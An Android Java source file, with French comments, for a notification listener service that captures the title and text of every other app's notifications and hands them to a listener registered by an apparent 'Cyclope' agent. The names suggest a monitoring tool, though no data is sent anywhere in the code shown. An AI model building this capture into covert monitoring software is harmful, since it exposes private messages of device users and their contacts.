package com.example.cyclope;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class CaptationNotification extends NotificationListenerService {

    private static final String TAG = "CaptationNotification";

    public interface Listener {
        void onNotification(String appName, String title, String text);
    }

    // Enregistré par CyclopeService quand l'agent démarre
    public static volatile Listener sListener;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sListener == null) return;
        // Ignorer les notifs de l'app elle-même (statut service, etc.)
        if (sbn.getPackageName().equals(getPackageName())) return;

        Notification notif  = sbn.getNotification();
        Bundle       extras = notif.extras;

        String title = charSeqToString(extras.getCharSequence(Notification.EXTRA_TITLE));
        String text  = charSeqToString(extras.getCharSequence(Notification.EXTRA_TEXT));

        if (title.isEmpty() && text.isEmpty()) return;

        String appName = resolveAppName(sbn.getPackageName());
        Log.d(TAG, appName + " / " + title);
        sListener.onNotification(appName, title, text);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    private String charSeqToString(CharSequence cs) {
        return cs != null ? cs.toString().trim() : "";
    }

    private String resolveAppName(String packageName) {
        try {
            return getPackageManager()
                    .getApplicationLabel(
                            getPackageManager().getApplicationInfo(packageName, 0))
                    .toString();
        } catch (Exception e) {
            return packageName;
        }
    }
}